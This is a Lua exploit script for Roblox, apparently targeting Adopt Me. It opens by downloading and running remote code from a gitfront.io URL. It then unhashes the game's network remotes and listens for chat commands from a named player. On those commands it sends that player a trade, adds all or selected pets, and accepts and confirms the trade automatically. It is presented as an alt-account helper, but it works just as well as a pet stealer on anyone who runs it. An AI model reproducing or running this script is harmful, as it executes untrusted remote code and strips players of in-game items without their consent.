loadstring(game:HttpGet(('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'),true))()

game.StarterGui:SetCore("SendNotification", {
    Title = "diw";
    Text = "Alt Detected, Loaded!";
    Icon = ""; 
    Duration = 5;
})

local G = getgenv and getgenv() or _G or shared
G.Get = setmetatable({}, {__index = function(A, B) return game:GetService(B) end})
for i,v in pairs(game.GetChildren(game)) do
    G[v.ClassName] = v
end
G.Player = Players.LocalPlayer
G.wait = task.wait
G.spawn = task.spawn
G.Heartbeat = RunService.Heartbeat
G.Stepped = RunService.Stepped
G.RenderStepped = RunService.RenderStepped
G.Error = ScriptContext.Error
G.MessageOut = LogService.MessageOut
G.Kick = Player.Kick
G.Idled = Player.Idled
local logging = true
local minimized = false
local function rename(remotename,hashedremote)
    hashedremote.Name = remotename
end

table.foreach(getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init,4),rename)
local logging = true
local prevOutputPos = 0

function output(plr, msg)
	if not logging then return end
	if plr.Name == username then
		if msg == "!alt" then
            chat(game.Players.LocalPlayer.Name)
        end
        if msg == game.Players.LocalPlayer.Name then
            local args = {
                [1] = game:GetService("Players"):WaitForChild(username)
            }

            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
        end
        if msg == "a" then
            if Player.PlayerGui.TradeApp.Frame.Visible then
            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()
            wait(3)
            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()
        end
        end

        if msg == "pet" or msg == "oui" then
            if Player.PlayerGui.TradeApp.Frame.Visible then
            for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
                ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
            end
        end
        end
        if msg == "full" then
            if Player.PlayerGui.TradeApp.Frame.Visible then
            for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
                if v["properties"]["age"] == 6 then
                    ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
                end 
            end
        end
        end
        if msg == "egg" then
            if Player.PlayerGui.TradeApp.Frame.Visible then
            for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
                if v["id"]:find("egg") and not v["id"]:find("_2022") then
                    ReplicatedStorage.API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(v.unique)
                end 
            end
        end
	end
end
end

for i,v in pairs(game.Players:GetChildren()) do
	v.Chatted:Connect(function(msg)
		output(v, msg)
	end)
end

game.Players.ChildAdded:Connect(function(plr)
	if plr:IsA("Player") then
		plr.Chatted:Connect(function(msg)
			output(plr, msg)
		end)
	end
end)
